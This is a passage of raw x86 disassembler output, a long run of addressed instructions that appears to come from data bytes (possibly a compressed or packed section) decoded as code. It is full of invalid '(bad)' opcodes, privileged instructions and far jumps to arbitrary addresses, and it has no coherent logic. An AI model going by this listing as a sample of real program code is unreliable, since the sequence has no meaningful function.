  41279c:	and    ecx,DWORD PTR [ecx-0x12b6921b]
  4127a2:	dec    ecx
  4127a3:	int3   
  4127a4:	pusha  
  4127a5:	das    
  4127a6:	arpl   bp,sp
  4127a8:	mov    ds,WORD PTR [eax-0x3b]
  4127ab:	xchg   DWORD PTR [edi+0x62],eax
  4127ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127af:	(bad)  
  4127b1:	scas   eax,DWORD PTR es:[edi]
  4127b2:	xor    DWORD PTR [ecx],eax
  4127b4:	cli    
  4127b5:	aas    
  4127b6:	inc    esi
  4127b7:	hlt    
  4127b8:	add    BYTE PTR [eax+0x4b1f987d],ah
  4127be:	adc    ecx,DWORD PTR [ebx-0xcc6be10]
  4127c4:	jmp    0x412751
  4127c6:	dec    ebp
  4127c7:	(bad)  
  4127c8:	cli    
  4127c9:	mov    eax,esi
  4127cb:	sti    
  4127cc:	push   ds
  4127cd:	or     BYTE PTR [ebx-0x7b9761d2],al
  4127d3:	pushf  
  4127d4:	mov    dl,0x5f
  4127d6:	push   ecx
  4127d7:	out    0x5c,al
  4127d9:	xlat   BYTE PTR ds:[ebx]
  4127da:	cmp    dh,dl
  4127dc:	and    al,0x6e
  4127de:	sbb    ebx,0x36
  4127e1:	pop    ebp
  4127e2:	or     ecx,DWORD PTR [eax+0xe]
  4127e5:	scas   al,BYTE PTR es:[edi]
  4127e6:	enter  0x2b01,0x2c
  4127ea:	add    BYTE PTR [edx],dl
  4127ec:	pop    ecx
  4127ed:	xlat   BYTE PTR ds:[ebx]
  4127ee:	fs jnp 0x41278c
  4127f1:	sub    BYTE PTR [esi],dh
  4127f3:	int    0xd8
  4127f5:	nop
  4127f6:	xor    esp,DWORD PTR [eax+0x71]
  4127f9:	inc    ebp
  4127fa:	push   ebx
  4127fb:	and    ecx,DWORD PTR [eax+0x6d0041a7]
  412801:	jmp    0xc3bf:0x5bba8bae
  412808:	add    esp,DWORD PTR [ebp+0x36]
  41280b:	or     al,0xab
  41280d:	jo     0x41288d
  41280f:	ret    
  412810:	adc    al,bh
  412812:	out    dx,eax
  412813:	pop    edi
  412814:	mov    dl,0x7a
  412816:	(bad)  [edx-0x14]
  412819:	test   DWORD PTR [ebx-0x14],ebx
  41281c:	stos   DWORD PTR es:[edi],eax
  41281d:	call   0x7823:0x7afda9
  412824:	int3   
  412825:	mov    BYTE PTR [edi+0x1b],al
  412828:	mov    ds:0x2e27cdb0,eax
  41282d:	cli    
  41282e:	stos   BYTE PTR es:[edi],al
  41282f:	popf   
  412830:	fisubr DWORD PTR gs:[esi]
  412833:	rcl    BYTE PTR [eax+0x25],cl
  412836:	lahf   
  412837:	rol    DWORD PTR [edi-0x14],1
  41283a:	das    
  41283b:	test   al,bl
  41283d:	or     DWORD PTR [esi-0x342ffcde],edi
  412843:	loop   0x4127f1
  412845:	add    al,cl
  412847:	pop    edi
  412848:	out    0xcc,al
  41284a:	push   ebx
  41284b:	add    BYTE PTR [ebx-0x43],0x51
  41284f:	jp     0x41286b
  412851:	or     al,0xcb
  412853:	xchg   edx,eax
  412854:	ins    DWORD PTR es:[edi],dx
  412855:	mov    BYTE PTR [esi-0x27],ch
  412858:	lds    edi,FWORD PTR [ecx+0x39]
  41285b:	retf   0x8962
  41285e:	xchg   ecx,eax
  41285f:	dec    esi
  412860:	mov    ds:0xd664c915,al
  412865:	add    eax,0x2ed72d64
  41286a:	(bad)  
  41286b:	sti    
  41286c:	retf   
  41286d:	repz ror BYTE PTR [ebp-0x615fb569],0x8
  412875:	pusha  
  412876:	adc    cl,ah
  412878:	cmp    bh,BYTE PTR fs:[eax]
  41287b:	sub    ebp,DWORD PTR [ebp+0x3043ca50]
  412881:	loopne 0x41287f
  412883:	mov    ebx,gs
  412885:	pushf  
  412886:	inc    edi
  412887:	sub    bl,BYTE PTR [ecx]
  412889:	aam    0x46
  41288b:	mov    al,0x6e
  41288d:	jmp    0x449f:0x4def5b27
  412894:	mov    cl,bh
  412896:	dec    eax
  412897:	jecxz  0x4128ce
  412899:	or     BYTE PTR [edx],al
  41289b:	and    ebp,DWORD PTR [ebp-0x27444ca6]
  4128a1:	and    eax,0xa6e75080
  4128a6:	loope  0x41288d
  4128a8:	push   ebx
  4128a9:	mov    cl,0x79
  4128ab:	sub    BYTE PTR [edi+0x2b],0x82
  4128af:	jmp    0x6c2cee2f
  4128b4:	dec    esi
  4128b5:	pop    esi
  4128b6:	sbb    BYTE PTR [ebp-0x3ec3f2df],dh
  4128bc:	ins    BYTE PTR es:[edi],dx
  4128bd:	sub    eax,0xe0d0e3f1
  4128c2:	lock xchg bh,cl
  4128c5:	jbe    0x4128d5
  4128c7:	sbb    DWORD PTR [esi+ebp*2],0xffffffc0
  4128cb:	push   edx
  4128cc:	push   eax
  4128cd:	xchg   edx,eax
  4128ce:	add    edx,ecx
  4128d0:	fsubp  st(5),st
  4128d2:	(bad)  
  4128d3:	enter  0x800a,0x72
  4128d7:	jmp    0xb1ae:0xe15c8d4e
  4128de:	add    al,0xc
  4128e0:	xchg   esi,eax
  4128e1:	inc    edx
  4128e2:	dec    ebp
  4128e3:	xchg   esp,eax
  4128e4:	xor    al,bl
  4128e6:	add    ah,BYTE PTR [ecx-0x73]
  4128e9:	xchg   esi,eax
  4128ea:	xchg   BYTE PTR [esi+0x6c],ah
  4128ed:	jmp    0xf03ebe4c
  4128f2:	loopne 0x4128be
  4128f4:	jl     0x41287d
  4128f6:	repnz xchg esi,eax
  4128f8:	jbe    0x412968
  4128fa:	(bad)  
  4128fb:	shr    BYTE PTR [ebx+ebx*4+0x17],cl
  4128ff:	add    al,0x5f
  412901:	mov    bl,0xf2
  412903:	cli    
  412904:	mov    bl,0x1f
  412906:	pusha  
  412907:	loope  0x412943
  412909:	mov    al,BYTE PTR [ebx-0x39]
  41290c:	leave  
  41290d:	push   eax
  41290e:	jecxz  0x412930
  412910:	push   esp
  412912:	aas    
  412913:	add    ebx,DWORD PTR [eax]
  412915:	add    DWORD PTR [edi+0x73243a13],edx
  41291b:	das    
  41291c:	and    BYTE PTR [ecx],0x8b
  41291f:	cmp    BYTE PTR ds:0x4f1478f0,bh
  412925:	inc    esi
  412926:	in     eax,dx
  412927:	stos   BYTE PTR es:[edi],al
  412928:	jg     0x4128df
  41292a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41292b:	and    eax,0x6025ae61
  412930:	xchg   esi,eax
  412931:	or     eax,0xb0299dfd
  412936:	in     al,dx
  412937:	icebp  
  412938:	sar    BYTE PTR [ebp+0x5b],0x9
  41293c:	sub    esi,DWORD PTR [edi+0x5e]
  41293f:	jge    0x412971
  412941:	add    edi,esp
  412943:	in     al,0x84
  412945:	and    eax,0x1bf149e0
  41294a:	jg     0x4128e9
  41294c:	push   ss
  41294d:	shl    ecx,0x1b
  412950:	mov    esp,0xa806b2d
  412955:	sbb    eax,0x55d91a09
  41295a:	add    BYTE PTR [ecx],dl
  41295c:	cld    
  41295d:	cmp    ebp,DWORD PTR ds:0xdb51f27f
  412963:	adc    ch,BYTE PTR [ebp-0x67a8a5f8]
  412969:	sbb    BYTE PTR [ebx],cl
  41296b:	inc    eax
  41296c:	lods   eax,DWORD PTR ds:[esi]
  41296d:	add    esi,ebx
  41296f:	or     ah,BYTE PTR [edi+0x58]
  412972:	mov    ebx,ds
  412974:	push   ebp
  412975:	mov    ebx,0x3718ac9e
  41297a:	jl     0x4129b9
  41297c:	mov    edx,0xf595abc4
  412981:	add    al,0x86
  412983:	ja     0x4129d2
  412985:	aaa    
  412986:	into   
  412987:	pop    ebp
  412988:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412989:	ss hlt 
  41298b:	es and eax,0x2b2a43e0
  412991:	xchg   esi,eax
  412992:	mov    DWORD PTR [ebx+eiz*4-0x12],edi
  412996:	push   eax
  412997:	call   0x6d12:0xbad9832f
  41299e:	push   edx
  41299f:	xchg   ebp,eax
  4129a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129a1:	into   
  4129a2:	in     eax,0x63
  4129a4:	imul   ecx,DWORD PTR [edx],0x45
  4129a7:	test   al,0x98
  4129a9:	aas    
  4129aa:	dec    edi
  4129ab:	sub    ebp,DWORD PTR [ebx]
  4129ad:	push   ebp
  4129ae:	push   ebx
  4129af:	stos   DWORD PTR es:[edi],eax
  4129b0:	inc    ebx
  4129b1:	xadd   ebp,edi
  4129b4:	sbb    al,dh
  4129b6:	les    eax,FWORD PTR [eax+0x4b]
  4129b9:	adc    BYTE PTR [edi+0x1a],ch
  4129bc:	loopne 0x4129f6
  4129be:	std    
  4129bf:	loopne 0x412992
  4129c1:	push   eax
  4129c2:	jne    0x4129cd
  4129c4:	inc    ebx
  4129c5:	jp     0x412a2b
  4129c7:	bnd jle 0x4129db
  4129ca:	mov    al,0x2b
  4129cc:	add    al,0x8e
  4129ce:	mov    ch,0x6b
  4129d0:	or     eax,0x1fd6efc6
  4129d5:	pop    ebx
  4129d6:	les    ebx,FWORD PTR [esi+ecx*4]
  4129d9:	mov    ebx,0xd5c339e9
  4129de:	jle    0x412a32
  4129e0:	xchg   esi,eax
  4129e1:	inc    ecx
  4129e2:	sbb    al,0xa1
  4129e4:	mov    esi,0xd41258a7
  4129e9:	pop    ebp
  4129ea:	pusha  
  4129eb:	retf   
  4129ec:	out    0xbd,al
  4129ee:	mov    WORD PTR [esi-0x7d],es
  4129f1:	or     eax,0x64cfa91e
  4129f6:	and    eax,0xb001535a
  4129fb:	add    ah,al
  4129fd:	add    DWORD PTR [edx+0x2c940a5],0x5a
  412a04:	shr    DWORD PTR [edx+0x11],0xd9
  412a08:	adc    esi,esp
  412a0a:	mov    ah,0xe1
  412a0c:	dec    esi
  412a0d:	iret   
  412a0e:	icebp  
  412a0f:	xor    DWORD PTR [eax],ecx
  412a11:	call   DWORD PTR [ebx+0x22d1d7d4]
  412a17:	popa   
  412a18:	scas   al,BYTE PTR es:[edi]
  412a19:	sbb    cl,ch
  412a1b:	into   
  412a1c:	inc    esi
  412a1d:	and    DWORD PTR [ebp+0x3367f681],ecx
  412a23:	adc    ch,bh
  412a25:	lods   eax,DWORD PTR ds:[esi]
  412a26:	and    ax,0x76d4
  412a2a:	pop    es
  412a2b:	loop   0x412a26
  412a2d:	fst    QWORD PTR [ecx]
  412a2f:	ins    BYTE PTR es:[edi],dx
  412a30:	push   es
  412a31:	das    
  412a32:	mov    esi,0x727e9243
  412a37:	pop    es
  412a38:	cmp    DWORD PTR [edi-0x5245c493],edi
  412a3e:	adc    dh,BYTE PTR [eax-0x63]
  412a41:	in     al,0x6f
  412a43:	xor    bl,dh
  412a45:	xchg   ebx,eax
  412a46:	and    BYTE PTR [edi+0x6e],0xe9
  412a4a:	jp     0x412a0b
  412a4c:	jae    0x4129d6
  412a4e:	fld    DWORD PTR [edx]
  412a50:	mov    ebx,ecx
  412a52:	inc    edx
  412a53:	mov    dh,0x89
  412a55:	pop    ebx
  412a56:	test   BYTE PTR [eax-0x1b1540f7],bl
  412a5c:	or     eax,0xfa860d71
  412a61:	add    DWORD PTR [esp+ecx*8+0x5f86a7bc],esi
  412a68:	sub    esi,DWORD PTR [ebx*2+0x6e9b172b]
  412a6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a70:	xchg   esi,eax
  412a71:	add    BYTE PTR [ecx+edx*4+0x12],ah
  412a75:	adc    dh,BYTE PTR ds:0xf4bacc74
  412a7b:	outs   dx,BYTE PTR ds:[esi]
  412a7c:	lods   al,BYTE PTR ds:[esi]
  412a7d:	mov    esi,0x18026d85
  412a82:	(bad)  
  412a84:	addr16 inc esp
  412a86:	pop    edi
  412a87:	enter  0x9095,0x5b
  412a8b:	arpl   WORD PTR [ecx+0x78],ax
  412a8e:	pop    es
  412a8f:	adc    eax,0x5e48f179
  412a94:	mov    es,WORD PTR ds:0x4fa36cc0
  412a9a:	sahf   
  412a9b:	push   eax
  412a9c:	sub    al,0xd3
  412a9e:	add    DWORD PTR [ebx+0x77],eax
  412aa1:	fsubr  DWORD PTR [eax-0x690f2710]
  412aa7:	scas   eax,DWORD PTR es:[edi]
  412aa8:	(bad)  
  412aa9:	cli    
  412aaa:	mov    ecx,0xc1534dad
  412aaf:	jmp    0xf807:0x60670b25
  412ab6:	and    eax,0x3e12c125
  412abb:	in     eax,0xb8
  412abd:	xor    al,0xa
  412abf:	sbb    BYTE PTR [ecx],bl
  412ac1:	aas    
  412ac2:	addr16 addr16 push esi
  412ac5:	jge    0x412abf
  412ac7:	ror    BYTE PTR [edi+0x11],cl
  412aca:	inc    edx
  412acb:	stc    
  412acc:	scas   eax,DWORD PTR es:[edi]
  412acd:	and    al,0xfb
  412acf:	jecxz  0x412ab1
  412ad1:	cmc    
  412ad2:	cli    
  412ad3:	loope  0x412ac5
  412ad5:	mov    esp,0xb4a4002b
  412ada:	popa   
  412adb:	fidivr DWORD PTR [edi]
  412add:	test   eax,0x23b0b476
  412ae2:	mov    edi,0xadef7c55
  412ae7:	cmp    esi,DWORD PTR [edx+0x1cef46ef]
  412aed:	pop    DWORD PTR [eax+edi*4-0x6]
  412af1:	cmp    DWORD PTR [esi],edx
  412af3:	xchg   ebx,eax
  412af4:	sbb    DWORD PTR [ebx],0xa3ef5440
  412afa:	sti    
  412afb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412afc:	xchg   ecx,eax
  412afd:	sar    eax,0xb6
  412b00:	and    DWORD PTR [eax+eax*4],ecx
  412b03:	jge    0x412b4d
  412b05:	dec    ebp
  412b06:	ret    
  412b07:	inc    esi
  412b08:	mov    esi,0xe7567385
  412b0d:	das    
  412b0e:	xlat   BYTE PTR ds:[ebx]
  412b0f:	pop    ds
  412b10:	icebp  
  412b11:	aam    0x31
  412b13:	mov    ecx,0x56d92a8d
  412b18:	cwde   
  412b19:	ins    BYTE PTR es:[edi],dx
  412b1a:	aam    0x61
  412b1c:	(bad)  
  412b1d:	mov    dh,0x5f
  412b1f:	ficom  WORD PTR [eax]
  412b21:	or     DWORD PTR [ebx+0x73],edx
  412b24:	sbb    eax,0x32ea299d
  412b29:	mov    edi,0x97842d2b
  412b2e:	xchg   ecx,eax
  412b2f:	inc    ebx
  412b30:	inc    ebx
  412b31:	adc    ah,dh
  412b33:	aaa    
  412b34:	xor    DWORD PTR [ebx+0x12],esp
  412b37:	or     eax,0x4b9d79c6
  412b3c:	inc    ecx
  412b3d:	add    al,0x85
  412b3f:	jle    0x412b0f
  412b41:	pop    es
  412b42:	in     eax,0xa0
  412b44:	loop   0x412aef
  412b46:	sbb    dh,bh
  412b48:	jnp    0x412ae5
  412b4a:	adc    dh,ch
  412b4c:	jne    0x412ae2
  412b4e:	shr    dh,1
  412b50:	inc    eax
  412b51:	mov    esi,DWORD PTR [edi+0x4c]
  412b54:	icebp  
  412b55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b56:	into   
  412b57:	jb     0x412b50
  412b59:	xor    eax,0x2b0fb3ea
  412b5e:	hlt    
  412b5f:	mov    edx,0xd6c7d6bb
  412b64:	not    BYTE PTR [ecx-0x67866865]
  412b6a:	rol    DWORD PTR [edx+0x77c13691],1
  412b70:	xor    DWORD PTR [edx],ebx
  412b72:	pop    esp
  412b73:	das    
  412b74:	bound  eax,QWORD PTR ds:0xff432204
  412b7a:	cwde   
  412b7b:	push   edi
  412b7c:	mov    edx,0xc190897c
  412b81:	mov    ch,0x2a
  412b83:	outs   dx,BYTE PTR ds:[esi]
  412b84:	jg     0x412be5
  412b86:	addr16 dec ebx
  412b88:	and    eax,0x73b1b2f2
  412b8d:	mov    edi,0xd53d4ea8
  412b92:	or     dl,BYTE PTR [ecx+ebp*4+0x5ff845f1]
  412b99:	adc    eax,0x4e871d63
  412b9e:	aaa    
  412b9f:	inc    ebx
  412ba0:	aas    
  412ba1:	mov    eax,0xba594e9f
  412ba6:	(bad)  
  412ba7:	ds std 
  412ba9:	popa   
  412baa:	fwait
  412bab:	fwait
  412bac:	aaa    
  412bad:	fstp   TBYTE PTR [ebx-0x1bb33303]
  412bb3:	push   ss
  412bb4:	ins    DWORD PTR es:[edi],dx
  412bb5:	aad    0xb0
  412bb7:	stos   DWORD PTR es:[edi],eax
  412bb8:	sbb    ah,BYTE PTR ds:0x42dbc9b5
  412bbe:	ror    DWORD PTR [esi+0x77],cl
  412bc1:	popf   
  412bc2:	cmp    BYTE PTR [esi],dl
  412bc4:	and    BYTE PTR [eax-0x4744898a],dh
  412bca:	sbb    DWORD PTR [ecx],ecx
  412bcc:	xor    ah,BYTE PTR [ebx]
  412bce:	jbe    0x412b90
  412bd0:	nop
  412bd1:	cmp    DWORD PTR [eax+0x55],ebx
  412bd4:	jl     0x412bdb
  412bd6:	cmp    eax,0x37dce9e0
  412bdb:	leave  
  412bdc:	pop    gs
  412bde:	mov    BYTE PTR [ebx-0x3db14303],dl
  412be4:	dec    esp
  412be5:	jp     0x412bdf
  412be7:	or     al,0x34
  412be9:	mov    ebp,0x3e65221d
  412bee:	push   es
  412bef:	enter  0xf682,0xff
  412bf3:	(bad)  
  412bf4:	pop    ebx
  412bf5:	xor    eax,esp
  412bf7:	aaa    
  412bf8:	and    ebx,DWORD PTR [edx]
  412bfa:	cmp    DWORD PTR [ebx-0xe0502f3],edx
  412c00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c01:	ret    
  412c02:	mov    ds:0xbb98cbf,al
  412c07:	test   DWORD PTR [esp+eiz*2],edx
  412c0a:	jns    0x412c26
  412c0c:	push   ecx
  412c0d:	xor    esi,esp
  412c0f:	sbb    eax,0xb548b344
  412c14:	lods   al,BYTE PTR ds:[esi]
  412c15:	iret   
  412c16:	mov    edx,0x3a9969e9
  412c1b:	mov    dl,0x5
  412c1d:	cdq    
  412c1e:	ins    BYTE PTR es:[edi],dx
  412c1f:	sbb    eax,0x82d90abb
  412c24:	push   esp
  412c25:	dec    eax
  412c26:	iret   
  412c27:	jnp    0x412bff
  412c29:	jne    0x412c4d
  412c2b:	mov    ebp,DWORD PTR [ecx+0x23098323]
  412c31:	adc    eax,0x5ac4ba0e
  412c36:	fwait
  412c37:	(bad)  
  412c38:	fbld   TBYTE PTR [ecx-0x68]
  412c3b:	xchg   BYTE PTR [edi],bh
  412c3d:	pop    ss
  412c3e:	lds    ebp,FWORD PTR [esi]
  412c40:	pop    ds
  412c41:	mov    dl,0x4b
  412c43:	xchg   esp,eax
  412c44:	pop    ecx
  412c45:	push   esi
  412c46:	sti    
  412c47:	cmp    esp,eax
  412c49:	mov    ebx,0x599e6fa2
  412c4e:	add    DWORD PTR [esi-0x8],0xffffffbe
  412c52:	scas   eax,DWORD PTR es:[edi]
  412c53:	add    DWORD PTR [edi],edi
  412c55:	dec    edx
  412c56:	xchg   ebx,eax
  412c57:	in     al,0xfb
  412c59:	stc    
  412c5a:	ins    DWORD PTR es:[edi],dx
  412c5b:	stos   BYTE PTR es:[edi],al
  412c5c:	xchg   edi,eax
  412c5d:	dec    DWORD PTR ds:0xfcd05d4f
  412c63:	ret    
  412c64:	add    edi,DWORD PTR [edx]
  412c66:	or     ebp,0x45a66043
  412c6c:	adc    al,0x30
  412c6e:	or     cl,BYTE PTR [eax+0x60]
  412c71:	mov    ds:0xa3361131,al
  412c76:	arpl   dx,sp
  412c78:	xor    eax,0x923b2042
  412c7d:	mov    dl,0x6b
  412c80:	dec    ebx
  412c81:	ret    
  412c82:	test   eax,0xe550dfe0
  412c87:	adc    al,0x47
  412c89:	push   eax
  412c8a:	daa    
  412c8b:	xchg   esp,eax
  412c8c:	mov    esi,0xa066153e
  412c91:	bound  ecx,QWORD PTR [edx]
  412c93:	mov    DWORD PTR [edi],esp
  412c95:	sar    al,cl
  412c97:	fdiv   st(3),st
  412c99:	loopne 0x412cf4
  412c9b:	std    
  412c9c:	inc    edi
  412c9d:	sbb    ebx,DWORD PTR [ebp-0x2e23eeb6]
  412ca3:	sbb    eax,0xda6a682e
  412ca8:	lahf   
  412ca9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412caa:	aad    0xe5
  412cac:	arpl   WORD PTR [ebx-0x350e2647],bp
  412cb2:	in     al,0xbc
  412cb4:	pop    edi
  412cb5:	cmp    ebp,ebp
  412cb7:	push   cs
  412cb8:	push   eax
  412cb9:	imul   esp,DWORD PTR [edx+ebx*8+0x9],0x1
  412cbe:	inc    esi
  412cbf:	cdq    
  412cc0:	les    ebx,FWORD PTR [ebp+0x73]
  412cc3:	push   ecx
  412cc4:	sub    ecx,DWORD PTR [ecx+0x2395943f]
  412cca:	fisubr WORD PTR [eax+eax*4+0x58]
  412cce:	add    ebx,DWORD PTR [ebx]
  412cd0:	mov    bl,0xf7
  412cd2:	jl     0x412c6f
  412cd4:	clc    
  412cd5:	mov    ebx,ebp
  412cd7:	mov    esp,DWORD PTR [esi]
  412cd9:	fadd   st,st(1)
  412cdb:	push   cs
  412cdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cdd:	xor    BYTE PTR [ebx-0x2cccf8d3],ah
  412ce3:	sbb    BYTE PTR [eax+0x7b4a5ed0],bl
  412ce9:	fiadd  WORD PTR [edi-0x3997ead]
  412cef:	sbb    BYTE PTR [ebx-0x7ac5534a],cl
  412cf5:	or     edi,DWORD PTR [ebp-0x7cb0c9d1]
  412cfb:	jl     0x412c80
  412cfd:	xchg   ebx,eax
  412cfe:	xor    BYTE PTR [ecx],ah
  412d00:	add    ebp,edx
  412d02:	mov    eax,ds:0x7cb8649d
  412d07:	cmp    bl,BYTE PTR [eax-0x773bb253]
  412d0d:	push   ds
  412d0e:	xchg   ebx,eax
  412d0f:	xchg   BYTE PTR [edi+0x1a],dh
  412d12:	sub    ebp,esp
  412d14:	(bad)
  412d18:	arpl   WORD PTR [eax+0x49],cx
  412d1b:	push   0xff305705
  412d20:	xchg   edi,eax
  412d21:	(bad)
  412d25:	les    esp,FWORD PTR [eax+0x60cf450a]
  412d2b:	cdq    
  412d2c:	test   eax,0x8d28cebf
  412d31:	mov    al,0xcb
  412d33:	hlt    
  412d34:	inc    ebp
  412d35:	pop    ebp
  412d36:	lahf   
  412d37:	fsub   st(1),st
  412d39:	or     al,0x79
  412d3b:	outs   dx,BYTE PTR ds:[esi]
  412d3c:	int3   
  412d3d:	hlt    
  412d3e:	ja     0x412ce5
  412d40:	dec    eax
  412d41:	cmp    DWORD PTR [edx+eax*2],0x31
  412d45:	daa    
  412d46:	(bad)  
  412d47:	and    DWORD PTR [edi],edx
  412d49:	scas   al,BYTE PTR es:[edi]
  412d4a:	inc    ebx
  412d4b:	fs iret 
  412d4d:	pusha  
  412d4e:	int    0x6
  412d50:	imul   esp,DWORD PTR [ebp-0x2d25987e],0xc9f13aad
  412d5a:	push   ds
  412d5b:	sbb    ecx,DWORD PTR [edx]
  412d5d:	mov    ecx,0xe8b845d
  412d62:	and    eax,0x73e4d0f1
  412d67:	fs push edi
  412d69:	int3   
  412d6a:	pop    ebx
  412d6b:	scas   al,BYTE PTR es:[edi]
  412d6c:	xor    al,0x97
  412d6e:	jg     0x412db6
  412d70:	jp     0x412d56
  412d72:	shr    dh,0x5c
  412d75:	pop    ebx
  412d76:	data16 fwait
  412d78:	fwait
  412d79:	cmp    al,dh
  412d7b:	fiadd  DWORD PTR [eax-0x4f4479c4]
  412d81:	push   ss
  412d82:	push   ebx
  412d83:	es retf 0x7915
  412d87:	es dec ecx
  412d89:	rol    ebp,cl
  412d8b:	aas    
  412d8c:	in     eax,0xd2
  412d8e:	cmp    al,0xec
  412d90:	ins    DWORD PTR es:[edi],dx
  412d91:	mov    ds:0x146e391c,al
  412d96:	fidivr DWORD PTR [edx+0x3b65d7fe]
  412d9c:	fdivrp st(5),st
  412d9e:	sbb    ecx,eax
  412da0:	cli    
  412da1:	cld    
  412da2:	push   edi
  412da3:	or     ecx,esi
  412da5:	test   al,bl
  412da7:	imul   BYTE PTR [edi-0x26052460]
  412dad:	stc    
  412dae:	addr16 mov al,ds:0x1389
  412db2:	xlat   BYTE PTR ds:[ebx]
  412db3:	dec    edi
  412db4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412db5:	jb     0x412dec
  412db7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412db8:	push   ecx
  412db9:	cdq    
  412dba:	xor    edx,DWORD PTR [esi+0x35]
  412dbd:	scas   eax,DWORD PTR es:[edi]
  412dbe:	retf   0x25fe
  412dc1:	inc    eax
  412dc2:	(bad)  
  412dc3:	fidiv  DWORD PTR [edx+edi*8]
  412dc6:	jne    0x412e2e
  412dc8:	dec    edi
  412dc9:	pop    esp
  412dca:	dec    edi
  412dcb:	cmp    eax,0x260088f7
  412dd0:	xor    DWORD PTR [ebx-0x4afae83d],esi
  412dd6:	test   eax,0x57343f30
  412ddb:	cld    
  412ddc:	dec    eax
  412ddd:	sub    ebx,eax
  412ddf:	outs   dx,DWORD PTR ds:[esi]
  412de0:	mov    ch,0xfd
  412de2:	inc    eax
  412de3:	outs   dx,DWORD PTR ds:[esi]
  412de4:	sub    BYTE PTR [edi+0x15b74b27],dl
  412dea:	fs add eax,0xe40a4faf
  412df0:	or     ebx,DWORD PTR [ebx]
  412df2:	ret    
  412df3:	cs jmp 0x535:0xfc036795
  412dfb:	xchg   edx,eax
  412dfc:	outs   dx,BYTE PTR ds:[esi]
  412dfd:	lods   al,BYTE PTR ds:[esi]
  412dfe:	xchg   ebx,eax
  412dff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e00:	fwait
  412e01:	or     ebx,DWORD PTR [ecx+0x5017b450]
  412e07:	je     0x412e46
  412e09:	inc    esp
  412e0a:	imul   edx,DWORD PTR [ecx+0x139fa519],0xb7628904
  412e14:	push   0x2070d793
  412e19:	out    0x2b,al
  412e1b:	(bad)  
  412e1d:	ss pop edi
  412e1f:	enter  0xeadd,0x3
  412e23:	xchg   ebx,eax
  412e24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e25:	daa    
  412e26:	dec    ebx
  412e27:	mov    esp,0x7b84a982
  412e2c:	lods   eax,DWORD PTR ds:[esi]
  412e2d:	dec    ebp
  412e2e:	pop    ds
  412e2f:	mov    bl,0x9b
  412e31:	xchg   esi,eax
  412e33:	dec    edi
  412e34:	retf   
  412e35:	inc    esp
  412e36:	and    edi,ebp
  412e38:	fmul   QWORD PTR ds:0x2b30f11f
  412e3e:	lock or DWORD PTR [eax+0x6e],esi
  412e42:	push   ax
  412e44:	repnz icebp 
  412e46:	lahf   
  412e47:	mov    al,0x56
  412e49:	xor    eax,0xb0b885c3
  412e4e:	cmc    
  412e4f:	fs iret 
  412e51:	cld    
  412e52:	ss mov esp,0xbfc6f963
  412e58:	xor    DWORD PTR [esi],esp
  412e5a:	jge    0x412e02
  412e5c:	sar    BYTE PTR [edx],1
  412e5e:	call   0xd5e3:0x5b61f782
  412e65:	js     0x412e69
  412e67:	push   ss
  412e68:	mov    eax,0x92294498
  412e6d:	xchg   DWORD PTR [ebp-0x178a59f8],ebp
  412e73:	jns    0x412e94
  412e75:	int3   
  412e76:	int    0x4
  412e78:	int    0xbf
  412e7a:	shl    BYTE PTR [esp+ecx*2-0x5f],cl
  412e7e:	call   0xcd9d:0x1d83eba2
  412e85:	mov    BYTE PTR [edi],bh
  412e87:	mov    ebp,0x360fd39e
  412e8c:	cwde   
  412e8d:	(bad)  [edx+0x3f]
  412e90:	outs   dx,BYTE PTR ds:[esi]
  412e91:	loop   0x412e71
  412e93:	xor    BYTE PTR [edi+0x6d735a3f],bl
  412e99:	out    dx,al
  412e9a:	retf   
  412e9b:	in     eax,dx
  412e9c:	ss lock in eax,dx
  412e9f:	xor    DWORD PTR ds:0x5606e30e,edx
  412ea5:	test   cl,bh
  412ea7:	xor    DWORD PTR [edx+ebx*4+0x58],edi
  412eab:	(bad)  
  412eac:	sbb    DWORD PTR [esi],eax
  412eae:	fst    DWORD PTR [ebx-0x48db1ce6]
  412eb4:	xchg   edx,eax
  412eb5:	out    0xf,al
  412eb7:	fs (bad) 
  412eb9:	jge    0x412ef1
  412ebb:	call   DWORD PTR [eax]
  412ebd:	cmp    al,0x3c
  412ebf:	into   
  412ec0:	pop    ebp
  412ec1:	cli    
  412ec2:	pop    ds
  412ec3:	xchg   edi,eax
  412ec4:	cmp    DWORD PTR [ebx+0x7],ebx
  412ec7:	into   
  412ec8:	hlt    
  412ec9:	imul   ecx,edi,0xd2ac88bc
  412ecf:	lods   eax,DWORD PTR ds:[esi]
  412ed0:	sbb    eax,0x223477b5
  412ed5:	outs   dx,BYTE PTR ds:[esi]
  412ed6:	add    BYTE PTR [esp+ebx*2],dh
  412ed9:	push   edx
  412eda:	sbb    BYTE PTR [esi-0x572892a1],ch
  412ee0:	mov    ebx,DWORD PTR ds:0x3282760d
  412ee6:	int3   
  412ee7:	out    dx,eax
  412ee8:	cmc    
  412ee9:	push   ecx
  412eea:	mov    esi,0x184a6e9c
  412eef:	retf   
  412ef0:	imul   esp,DWORD PTR [ebp+0x36],0xffffff85
  412ef4:	jo     0x412f2d
  412ef6:	cmp    al,0xe1
  412ef8:	inc    ebx
  412ef9:	add    dl,dl
  412efb:	xchg   esi,eax
  412efc:	in     al,0xa2
  412efe:	mov    esi,0x1d790ebc
  412f03:	xchg   ch,bh
  412f05:	sbb    al,0x45
  412f07:	scas   al,BYTE PTR es:[edi]
  412f08:	aas    
  412f09:	rcl    DWORD PTR [ebx+0x37],1
  412f0c:	mov    cl,0x31
  412f0e:	cli    
  412f0f:	push   edx
  412f10:	adc    DWORD PTR [eax-0x53bff5a1],edi
  412f16:	and    BYTE PTR [esi-0x3a9e265b],ah
  412f1c:	push   0xffffff83
